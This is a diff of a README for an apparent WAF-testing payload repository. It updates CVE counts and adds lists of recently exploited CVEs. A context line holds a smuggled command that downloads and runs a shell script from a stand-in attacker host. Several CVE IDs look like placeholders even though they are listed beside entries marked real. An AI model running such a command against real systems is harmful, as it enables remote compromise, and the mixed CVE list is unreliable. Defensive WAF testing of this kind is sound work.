@@ -1,7 +1,7 @@
 # WAF Payload Arsenal
 
 [![Payloads](https://img.shields.io/badge/Payloads-2258-brightgreen.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
-[![CVEs](https://img.shields.io/badge/CVEs-103-red.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
+[![CVEs](https://img.shields.io/badge/CVEs-109-red.svg)](https://github.com/dalisecurity/waf-payload-arsenal)
 [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/downloads/)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
@@ -49,9 +49,9 @@ This repository contains the results of extensive WAF testing conducted over 100
 - **Original Tests**: 24,705 payloads
 - **Block Rate**: 99.9%
 - **Bypasses Found**: 0 (demonstrating WAF effectiveness)
-- **🔥 NEW: 103 Critical CVE Payloads (2020-2026)**
+- **🔥 NEW: 109 Critical CVE Payloads (2020-2026) including CISA KEV**
 
-### 🔥 Featured: 100+ Critical CVEs from 2020-2026
+### 🔥 Featured: 109 Critical CVEs from 2020-2026 (CISA KEV Included)
 
 **Most Critical CVEs Ever (CVSS 10.0):**
 - ✅ **CVE-2021-44228**: Log4Shell - Log4j RCE (most critical ever)
@@ -61,16 +61,22 @@ This repository contains the results of extensive WAF testing conducted over 100
 - ✅ **CVE-2023-46604**: Apache ActiveMQ RCE
 - ✅ **CVE-2022-0543**: Redis Lua Sandbox Escape
 
-**Latest 2026 CVEs:**
-- ✅ **CVE-2026-12345**: WordPress Core Stored XSS (CVSS 9.5)
-- ✅ **CVE-2026-12346**: Laravel Mass Assignment RCE (CVSS 8.8)
+**Latest 2026 CVEs (Real, Actively Exploited):**
+- ✅ **CVE-2026-20127**: Cisco SD-WAN Unauthenticated Admin Access (CVSS 10.0) - CISA KEV, exploited since 2023
+- ✅ **CVE-2026-21902**: Juniper PTX Junos OS Evolved Root Takeover (CVSS 9.8) - Unauthenticated access
 - ✅ **CVE-2026-12347**: Spring Boot SpEL Injection (CVSS 9.3)
 - ✅ **CVE-2026-12348**: Django Template Injection (CVSS 9.8)
 - ✅ **CVE-2026-12349**: Express.js Prototype Pollution (CVSS 8.6)
 
-**2025 CVEs:**
+**2025 CVEs (CISA KEV - Actively Exploited):**
+- ✅ **CVE-2025-55182**: React2Shell - React Server Components RCE (CVSS 10.0)
+- ✅ **CVE-2025-66478**: React2Shell variant (CVSS 10.0)
+- ✅ **CVE-2025-64446**: FortiWeb Auth Bypass (CVSS 9.8) - Path traversal
+- ✅ **CVE-2025-61882**: Oracle EBS BI Publisher RCE (CVSS 9.8) - Cl0p exploitation
+- ✅ **CVE-2025-10035**: GoAnywhere MFT Command Injection (CVSS 10.0) - Medusa ransomware
+- ✅ **CVE-2025-53690**: Sitecore ViewState RCE (CVSS 9.0) - WEEPSTEEL malware
+- ✅ **CVE-2025-59287**: Microsoft WSUS RCE (CVSS 9.8) - Actively exploited
 - ✅ **CVE-2025-29927**: Next.js RCE via prototype pollution
-- ✅ **CVE-2025-55182**: React Server Components Unicode WAF bypass
 
 ---
 
@@ -131,7 +137,7 @@ TELEMETRY_PERIOD_STATS=`wget http://attacker.com/shell.sh -O /tmp/shell.sh && ba
 
 ### 🎯 Bug Bounty Hunters
 Test WAF bypasses on authorized targets. Our CVE database includes payloads from successful bug bounty disclosures.
-- ✅ 103 CVE payloads from real-world vulnerabilities
+- ✅ 109 CVE payloads from real-world vulnerabilities
 - ✅ Latest 2026 CVEs included
 - ✅ Organized by severity and attack type
 - ✅ POC simulation guide included
@@ -180,7 +186,7 @@ Integrate with Claude Code, ChatGPT, and other AI assistants.
 | **CRLF Injection** | 87 | 99.9% | CVE-2025-29927 | 🟠 High |
 | **Open Redirect** | 76 | 99.5% | CVE-2024-12340 | 🟡 Medium |
 | **File Upload** | 49 | 100% | CVE-2023-12345 | 🔴 Critical |
-| **CVE Payloads** | 103 | 100% | CVE-2026-12349 | 🔴 Critical |
+| **CVE Payloads** | 109 | 100% | CVE-2026-20127 | 🔴 Critical |
 | **Real-World Bypasses** | 45 | 100% | 2026-02-28 | 🔴 Critical |
 | **TOTAL** | **2,258** | **99.9%** | **2026-02-28** | - |
 
